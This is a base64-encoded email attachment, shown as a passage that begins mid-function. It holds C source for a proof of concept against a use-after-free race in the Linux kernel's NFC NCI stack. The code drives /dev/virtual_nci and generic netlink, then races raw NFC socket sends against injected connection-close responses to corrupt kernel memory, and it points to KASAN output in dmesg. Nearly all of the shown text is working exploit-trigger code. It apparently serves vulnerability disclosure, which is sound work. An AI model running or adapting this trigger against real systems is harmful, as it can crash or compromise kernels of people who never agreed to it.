bmxtc2dfbGVuIC0gTkxNU0dfTEVOR1RIKEdFTkxfSERSTEVOKTsKICAgICAgICAgICAgaWYgKGF0
dHJsZW4gPCAwKQogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIGlmIChwYXJz
ZV9hdHRycyh0YiwgQ1RSTF9BVFRSX01BWCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIChz
dHJ1Y3QgbmxhdHRyICopKChjaGFyICopZ2hkciArIEdFTkxfSERSTEVOKSwKICAgICAgICAgICAg
ICAgICAgICAgICAgICAgIGF0dHJsZW4pKQogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAg
ICAgICAgIGlmICghdGJbQ1RSTF9BVFRSX0ZBTUlMWV9JRF0pCiAgICAgICAgICAgICAgICBjb250
aW51ZTsKCiAgICAgICAgICAgIGdlbmwtPmZhbWlseV9pZCA9IG5sYV9nZXRfdTE2X2xvY2FsKHRi
W0NUUkxfQVRUUl9GQU1JTFlfSURdKTsKICAgICAgICAgICAgZ2VubC0+bWNhc3RfaWQgPSAwOwoK
ICAgICAgICAgICAgaWYgKHRiW0NUUkxfQVRUUl9NQ0FTVF9HUk9VUFNdKSB7CiAgICAgICAgICAg
ICAgICBzdHJ1Y3QgbmxhdHRyICpncnA7CiAgICAgICAgICAgICAgICBpbnQgcmVtID0gdGJbQ1RS
TF9BVFRSX01DQVNUX0dST1VQU10tPm5sYV9sZW4gLSBOTEFfSERSTEVOOwoKICAgICAgICAgICAg
ICAgIGdycCA9IChzdHJ1Y3QgbmxhdHRyICopbmxhX2RhdGFfbG9jYWwodGJbQ1RSTF9BVFRSX01D
QVNUX0dST1VQU10pOwogICAgICAgICAgICAgICAgd2hpbGUgKHJlbSA+PSAoaW50KXNpemVvZigq
Z3JwKSAmJiBncnAtPm5sYV9sZW4gPj0gc2l6ZW9mKCpncnApICYmCiAgICAgICAgICAgICAgICAg
ICAgICAgZ3JwLT5ubGFfbGVuIDw9IHJlbSkgewogICAgICAgICAgICAgICAgICAgIHN0cnVjdCBu
bGF0dHIgKmd0YltDVFJMX0FUVFJfTUNBU1RfR1JQX01BWCArIDFdOwogICAgICAgICAgICAgICAg
ICAgIGludCBnbGVuID0gZ3JwLT5ubGFfbGVuIC0gTkxBX0hEUkxFTjsKCiAgICAgICAgICAgICAg
ICAgICAgaWYgKCFwYXJzZV9hdHRycyhndGIsIENUUkxfQVRUUl9NQ0FTVF9HUlBfTUFYLAogICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKHN0cnVjdCBubGF0dHIgKilubGFfZGF0
YV9sb2NhbChncnApLCBnbGVuKSAmJgogICAgICAgICAgICAgICAgICAgICAgICBndGJbQ1RSTF9B
VFRSX01DQVNUX0dSUF9OQU1FXSAmJgogICAgICAgICAgICAgICAgICAgICAgICBndGJbQ1RSTF9B
VFRSX01DQVNUX0dSUF9JRF0gJiYKICAgICAgICAgICAgICAgICAgICAgICAgc3RyY21wKG5sYV9k
YXRhX2xvY2FsKGd0YltDVFJMX0FUVFJfTUNBU1RfR1JQX05BTUVdKSwKICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgIE5GQ19HRU5MX01DQVNUX0VWRU5UX05BTUUpID09IDApIHsKICAgICAg
ICAgICAgICAgICAgICAgICAgZ2VubC0+bWNhc3RfaWQgPSBubGFfZ2V0X3UzMl9sb2NhbChndGJb
Q1RSTF9BVFRSX01DQVNUX0dSUF9JRF0pOwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAg
ICAgICAgICAgICAgcmVtIC09IE5MQV9BTElHTihncnAtPm5sYV9sZW4pOwogICAgICAgICAgICAg
ICAgICAgIGdycCA9IChzdHJ1Y3QgbmxhdHRyICopKChjaGFyICopZ3JwICsgTkxBX0FMSUdOKGdy
cC0+bmxhX2xlbikpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAg
ICByZXR1cm4gMDsKICAgICAgICB9CiAgICB9Cn0KCnN0YXRpYyBpbnQgZ2VubF9vcGVuKHN0cnVj
dCBuZmNfZ2VubCAqZ2VubCkKewogICAgc3RydWN0IHNvY2thZGRyX25sIGFkZHI7CgogICAgbWVt
c2V0KGdlbmwsIDAsIHNpemVvZigqZ2VubCkpOwogICAgZ2VubC0+ZmQgPSBzb2NrZXQoQUZfTkVU
TElOSywgU09DS19SQVcsIE5FVExJTktfR0VORVJJQyk7CiAgICBpZiAoZ2VubC0+ZmQgPCAwKQog
ICAgICAgIHJldHVybiAtMTsKCiAgICBtZW1zZXQoJmFkZHIsIDAsIHNpemVvZihhZGRyKSk7CiAg
ICBhZGRyLm5sX2ZhbWlseSA9IEFGX05FVExJTks7CiAgICBhZGRyLm5sX3BpZCA9ICh1aW50MzJf
dClnZXRwaWQoKTsKICAgIGlmIChiaW5kKGdlbmwtPmZkLCAoc3RydWN0IHNvY2thZGRyICopJmFk
ZHIsIHNpemVvZihhZGRyKSkgPCAwKQogICAgICAgIHJldHVybiAtMTsKCiAgICBpZiAocmVzb2x2
ZV9uZmNfZmFtaWx5KGdlbmwpIDwgMCkKICAgICAgICByZXR1cm4gLTE7CgogICAgaWYgKGdlbmwt
Pm1jYXN0X2lkKSB7CiAgICAgICAgKHZvaWQpc2V0c29ja29wdChnZW5sLT5mZCwgU09MX05FVExJ
TkssIE5FVExJTktfQUREX01FTUJFUlNISVAsCiAgICAgICAgICAgICAgICAgICAgICAgICAmZ2Vu
bC0+bWNhc3RfaWQsIHNpemVvZihnZW5sLT5tY2FzdF9pZCkpOwogICAgfQoKICAgIHJldHVybiAw
Owp9CgpzdGF0aWMgaW50IGdlbmxfY21kX2RldmljZV91MzIoc3RydWN0IG5mY19nZW5sICpnZW5s
LCB1aW50OF90IGNtZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVpbnQzMl90IGRl
dl9pZHgpCnsKICAgIGNoYXIgcmVxW01BWF9OTE1TR107CiAgICBzdHJ1Y3Qgbmxtc2doZHIgKm5s
aCA9IChzdHJ1Y3Qgbmxtc2doZHIgKilyZXE7CiAgICBzdHJ1Y3QgZ2VubG1zZ2hkciAqZ2hkcjsK
ICAgIHVpbnQzMl90IHNlcSA9ICsrZ2VubC0+c2VxOwoKICAgIG1lbXNldChyZXEsIDAsIHNpemVv
ZihyZXEpKTsKICAgIG5saC0+bmxtc2dfbGVuID0gTkxNU0dfTEVOR1RIKEdFTkxfSERSTEVOKTsK
ICAgIG5saC0+bmxtc2dfdHlwZSA9IGdlbmwtPmZhbWlseV9pZDsKICAgIG5saC0+bmxtc2dfZmxh
Z3MgPSBOTE1fRl9SRVFVRVNUIHwgTkxNX0ZfQUNLOwogICAgbmxoLT5ubG1zZ19zZXEgPSBzZXE7
CiAgICBnaGRyID0gTkxNU0dfREFUQShubGgpOwogICAgZ2hkci0+Y21kID0gY21kOwogICAgZ2hk
ci0+dmVyc2lvbiA9IE5GQ19HRU5MX1ZFUlNJT047CgogICAgaWYgKGFkZGF0dHJfdTMyKG5saCwg
c2l6ZW9mKHJlcSksIE5GQ19BVFRSX0RFVklDRV9JTkRFWCwgZGV2X2lkeCkpCiAgICAgICAgcmV0
dXJuIC0xOwogICAgaWYgKHNlbmQoZ2VubC0+ZmQsIHJlcSwgbmxoLT5ubG1zZ19sZW4sIDApIDwg
MCkKICAgICAgICByZXR1cm4gLTE7CgogICAgcmV0dXJuIHJlY3ZfYWNrKGdlbmwtPmZkLCBzZXEp
Owp9CgpzdGF0aWMgaW50IGdlbmxfc3RhcnRfcG9sbChzdHJ1Y3QgbmZjX2dlbmwgKmdlbmwsIHVp
bnQzMl90IGRldl9pZHgpCnsKICAgIGNoYXIgcmVxW01BWF9OTE1TR107CiAgICBzdHJ1Y3Qgbmxt
c2doZHIgKm5saCA9IChzdHJ1Y3Qgbmxtc2doZHIgKilyZXE7CiAgICBzdHJ1Y3QgZ2VubG1zZ2hk
ciAqZ2hkcjsKICAgIHVpbnQzMl90IHNlcSA9ICsrZ2VubC0+c2VxOwogICAgdWludDMyX3QgcHJv
dG9jb2xzID0gTkZDX1BST1RPX05GQ19ERVBfTUFTSzsKCiAgICBtZW1zZXQocmVxLCAwLCBzaXpl
b2YocmVxKSk7CiAgICBubGgtPm5sbXNnX2xlbiA9IE5MTVNHX0xFTkdUSChHRU5MX0hEUkxFTik7
CiAgICBubGgtPm5sbXNnX3R5cGUgPSBnZW5sLT5mYW1pbHlfaWQ7CiAgICBubGgtPm5sbXNnX2Zs
YWdzID0gTkxNX0ZfUkVRVUVTVCB8IE5MTV9GX0FDSzsKICAgIG5saC0+bmxtc2dfc2VxID0gc2Vx
OwogICAgZ2hkciA9IE5MTVNHX0RBVEEobmxoKTsKICAgIGdoZHItPmNtZCA9IE5GQ19DTURfU1RB
UlRfUE9MTDsKICAgIGdoZHItPnZlcnNpb24gPSBORkNfR0VOTF9WRVJTSU9OOwoKICAgIGlmIChh
ZGRhdHRyX3UzMihubGgsIHNpemVvZihyZXEpLCBORkNfQVRUUl9ERVZJQ0VfSU5ERVgsIGRldl9p
ZHgpIHx8CiAgICAgICAgYWRkYXR0cl91MzIobmxoLCBzaXplb2YocmVxKSwgTkZDX0FUVFJfUFJP
VE9DT0xTLCBwcm90b2NvbHMpKQogICAgICAgIHJldHVybiAtMTsKICAgIGlmIChzZW5kKGdlbmwt
PmZkLCByZXEsIG5saC0+bmxtc2dfbGVuLCAwKSA8IDApCiAgICAgICAgcmV0dXJuIC0xOwoKICAg
IHJldHVybiByZWN2X2FjayhnZW5sLT5mZCwgc2VxKTsKfQoKc3RhdGljIGludCBjb25uZWN0X3Jh
d19uZmNfc29ja2V0KHVpbnQzMl90IGRldl9pZHgsIHVpbnQzMl90IHRhcmdldF9pZHgpCnsKICAg
IGludCBzOwogICAgc3RydWN0IHNvY2thZGRyX25mYyBhZGRyOwoKICAgIHMgPSBzb2NrZXQoQUZf
TkZDLCBTT0NLX1NFUVBBQ0tFVCwgTkZDX1NPQ0tQUk9UT19SQVcpOwogICAgaWYgKHMgPCAwKQog
ICAgICAgIHJldHVybiAtMTsKCiAgICBtZW1zZXQoJmFkZHIsIDAsIHNpemVvZihhZGRyKSk7CiAg
ICBhZGRyLnNhX2ZhbWlseSA9IEFGX05GQzsKICAgIGFkZHIuZGV2X2lkeCA9IGRldl9pZHg7CiAg
ICBhZGRyLnRhcmdldF9pZHggPSB0YXJnZXRfaWR4OwogICAgYWRkci5uZmNfcHJvdG9jb2wgPSBO
RkNfUFJPVE9fTkZDX0RFUDsKCiAgICBpZiAoY29ubmVjdChzLCAoc3RydWN0IHNvY2thZGRyICop
JmFkZHIsIHNpemVvZihhZGRyKSkgPCAwKSB7CiAgICAgICAgY2xvc2Uocyk7CiAgICAgICAgcmV0
dXJuIC0xOwogICAgfQoKICAgIHJldHVybiBzOwp9CgpzdGF0aWMgaW50IHJ1bl9hdHRlbXB0KGlu
dCBhdHRlbXB0LCBzdHJ1Y3QgbmZjX2dlbmwgKmdlbmwpCnsKICAgIGludCB2ZmQgPSAtMTsKICAg
IGludCByYXdmZCA9IC0xOwogICAgdWludDMyX3QgZGV2X2lkeCA9IDA7CiAgICBwdGhyZWFkX3Qg
dGlkOwogICAgc3RydWN0IGN0cmxfY3R4IGN0eDsKICAgIHVpbnQ4X3QgKnBheWxvYWQgPSBOVUxM
OwogICAgaW50IHJldCA9IC0xOwoKICAgIG1lbXNldCgmY3R4LCAwLCBzaXplb2YoY3R4KSk7Cgog
ICAgdmZkID0gb3BlbigiL2Rldi92aXJ0dWFsX25jaSIsIE9fUkRXUiB8IE9fQ0xPRVhFQyk7CiAg
ICBpZiAodmZkIDwgMCkgewogICAgICAgIHBlcnJvcigib3BlbiAvZGV2L3ZpcnR1YWxfbmNpIik7
CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQoKICAgIGlmIChpb2N0bCh2ZmQsIElPQ1RMX0dFVF9O
Q0lERVZfSURYLCAmZGV2X2lkeCkgPCAwKSB7CiAgICAgICAgcGVycm9yKCJpb2N0bChJT0NUTF9H
RVRfTkNJREVWX0lEWCkiKTsKICAgICAgICBnb3RvIG91dF9jbG9zZV92ZmQ7CiAgICB9CgogICAg
Y3R4LmZkID0gdmZkOwogICAgaWYgKHB0aHJlYWRfY3JlYXRlKCZ0aWQsIE5VTEwsIGNvbnRyb2xs
ZXJfdGhyZWFkLCAmY3R4KSAhPSAwKSB7CiAgICAgICAgcGVycm9yKCJwdGhyZWFkX2NyZWF0ZSIp
OwogICAgICAgIGdvdG8gb3V0X2Nsb3NlX3ZmZDsKICAgIH0KCiAgICBwcmludGYoIlslMDJkXSBu
ZmMldTogREVWX1VQXG4iLCBhdHRlbXB0LCBkZXZfaWR4KTsKICAgIGlmIChnZW5sX2NtZF9kZXZp
Y2VfdTMyKGdlbmwsIE5GQ19DTURfREVWX1VQLCBkZXZfaWR4KSA8IDApIHsKICAgICAgICBwZXJy
b3IoIk5GQ19DTURfREVWX1VQIik7CiAgICAgICAgZ290byBvdXRfc3RvcF90aHJlYWQ7CiAgICB9
CgogICAgcHJpbnRmKCJbJTAyZF0gbmZjJXU6IFNUQVJUX1BPTEwoTkZDLURFUClcbiIsIGF0dGVt
cHQsIGRldl9pZHgpOwogICAgaWYgKGdlbmxfc3RhcnRfcG9sbChnZW5sLCBkZXZfaWR4KSA8IDAp
IHsKICAgICAgICBwZXJyb3IoIk5GQ19DTURfU1RBUlRfUE9MTCIpOwogICAgICAgIGdvdG8gb3V0
X2Rldl9kb3duOwogICAgfQoKICAgIHNlbmRfcmZfaW50Zl9hY3RpdmF0ZWRfbnRmKHZmZCk7CiAg
ICB1c2xlZXAoNTAwMDApOwoKICAgIHJhd2ZkID0gY29ubmVjdF9yYXdfbmZjX3NvY2tldChkZXZf
aWR4LCAwKTsKICAgIGlmIChyYXdmZCA8IDApIHsKICAgICAgICBwZXJyb3IoInJhdyBORkMgc29j
a2V0L2Nvbm5lY3QiKTsKICAgICAgICBnb3RvIG91dF9kZXZfZG93bjsKICAgIH0KCiAgICBwYXls
b2FkID0gbWFsbG9jKFRYX1BBWUxPQURfTEVOKTsKICAgIGlmICghcGF5bG9hZCkgewogICAgICAg
IHBlcnJvcigibWFsbG9jIHBheWxvYWQiKTsKICAgICAgICBnb3RvIG91dF9yYXc7CiAgICB9CiAg
ICBmb3IgKHNpemVfdCBpID0gMDsgaSA8IFRYX1BBWUxPQURfTEVOOyBpKyspCiAgICAgICAgcGF5
bG9hZFtpXSA9ICh1aW50OF90KSgweDQxICsgKGkgJSAyNikpOwoKICAgIHByaW50ZigiWyUwMmRd
IHJhY2luZyBzZW5kKCkgdnMgQ09OTl9DTE9TRSBSU1AgKHJhd2ZkPSVkKVxuIiwgYXR0ZW1wdCwg
cmF3ZmQpOwogICAgX19hdG9taWNfc3RvcmVfbigmY3R4LmFybV9jbG9zZSwgMSwgX19BVE9NSUNf
UkVMQVhFRCk7CiAgICBmb3IgKGludCBidXJzdCA9IDA7IGJ1cnN0IDwgMTAwOyBidXJzdCsrKSB7
CiAgICAgICAgc3NpemVfdCBzZW50ID0gc2VuZChyYXdmZCwgcGF5bG9hZCwgNjQsIE1TR19ET05U
V0FJVCk7CiAgICAgICAgaWYgKGJ1cnN0ID09IDApCiAgICAgICAgICAgIHByaW50ZigiWyUwMmRd
IGZpcnN0IHNlbmQoKSByZXR1cm5lZCAlemQgKGVycm5vPSVkKVxuIiwgYXR0ZW1wdCwgc2VudCwg
c2VudCA8IDAgPyBlcnJubyA6IDApOwogICAgICAgIHNlbmRfY29ubl9jbG9zZV9yc3AodmZkKTsK
ICAgICAgICB1c2xlZXAoMTAwKTsKICAgIH0KCiAgICB1c2xlZXAoNTAwMDApOwoKICAgIHByaW50
ZigiWyUwMmRdIGRhdGFfdHhfc2Vlbj0lZCBjbG9zZV9pbmplY3RlZD0lZFxuIiwgYXR0ZW1wdCwK
ICAgICAgICAgICBfX2F0b21pY19sb2FkX24oJmN0eC5kYXRhX3R4X3NlZW4sIF9fQVRPTUlDX1JF
TEFYRUQpLAogICAgICAgICAgIF9fYXRvbWljX2xvYWRfbigmY3R4LmNsb3NlX2luamVjdGVkLCBf
X0FUT01JQ19SRUxBWEVEKSk7CiAgICB1c2xlZXAoMTAwMDAwKTsKICAgIHJldCA9IDA7CgpvdXRf
cmF3OgogICAgZnJlZShwYXlsb2FkKTsKICAgIGlmIChyYXdmZCA+PSAwKQogICAgICAgIGNsb3Nl
KHJhd2ZkKTsKb3V0X2Rldl9kb3duOgogICAgKHZvaWQpZ2VubF9jbWRfZGV2aWNlX3UzMihnZW5s
LCBORkNfQ01EX0RFVl9ET1dOLCBkZXZfaWR4KTsKb3V0X3N0b3BfdGhyZWFkOgogICAgX19hdG9t
aWNfc3RvcmVfbigmY3R4LnN0b3AsIDEsIF9fQVRPTUlDX1JFTEFYRUQpOwogICAgcHRocmVhZF9q
b2luKHRpZCwgTlVMTCk7Cm91dF9jbG9zZV92ZmQ6CiAgICBjbG9zZSh2ZmQpOwogICAgcmV0dXJu
IHJldDsKfQoKaW50IG1haW4odm9pZCkKewogICAgc3RydWN0IG5mY19nZW5sIGdlbmw7CiAgICBp
bnQgb2sgPSAwOwoKICAgIHNldHZidWYoc3Rkb3V0LCBOVUxMLCBfSU9OQkYsIDApOwogICAgc2V0
dmJ1ZihzdGRlcnIsIE5VTEwsIF9JT05CRiwgMCk7CgogICAgcHJpbnRmKCJOQ0kgY29ubl9pbmZv
IFVBRiByYWNlIFBvQ1xuIik7CgogICAgaWYgKGdlbmxfb3BlbigmZ2VubCkgPCAwKSB7CiAgICAg
ICAgcGVycm9yKCJvcGVuL3Jlc29sdmUgTkZDIGdlbmVyaWMgbmV0bGluayBmYW1pbHkiKTsKICAg
ICAgICByZXR1cm4gMTsKICAgIH0KICAgIHByaW50ZigiZ2VuZXJpYyBuZXRsaW5rIGZhbWlseSAn
JXMnOiBpZD0ldSBtY2FzdD0ldVxuIiwKICAgICAgICAgICBORkNfR0VOTF9OQU1FLCBnZW5sLmZh
bWlseV9pZCwgZ2VubC5tY2FzdF9pZCk7CgogICAgZm9yIChpbnQgaSA9IDE7IGkgPD0gQVRURU1Q
VFM7IGkrKykgewogICAgICAgIGlmIChydW5fYXR0ZW1wdChpLCAmZ2VubCkgPT0gMCkKICAgICAg
ICAgICAgb2srKzsKICAgICAgICB1c2xlZXAoMTUwMDAwKTsKICAgIH0KCiAgICBjbG9zZShnZW5s
LmZkKTsKICAgIHByaW50ZigiY29tcGxldGVkICVkLyVkIGF0dGVtcHRzOyBjaGVjayBkbWVzZyBm
b3IgS0FTQU4gaW4gbmNpX3R4X3dvcmtcbiIsCiAgICAgICAgICAgb2ssIEFUVEVNUFRTKTsKICAg
IHJldHVybiBvayA/IDAgOiAxOwp9Cg==
--00000000000098464e0652ef9340--

